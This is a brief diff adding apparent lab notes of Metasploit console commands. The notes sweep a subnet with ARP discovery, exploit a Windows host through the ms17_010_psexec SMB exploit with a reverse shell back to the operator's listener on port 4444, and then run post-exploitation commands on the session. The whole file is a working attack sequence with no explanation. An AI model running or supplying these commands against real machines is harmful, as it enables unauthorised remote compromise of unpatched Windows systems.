@@ -1,0 +1,22 @@
+
+msfconsole
+
+use auxiliary/scanner/discovery/arp_sweep
+set RHOSTS 192.168.100.0/24
+set THREADS 15
+run
+exit
+
+msfconsole
+
+use exploit/windows/smb/ms17_010_psexec
+show options
+set RHOSTS 192.168.1.150
+set LHOST 192.168.1.10
+set LPORT 4444
+run
+
+sysinfo
+ps
+sessions -i 2
+exit
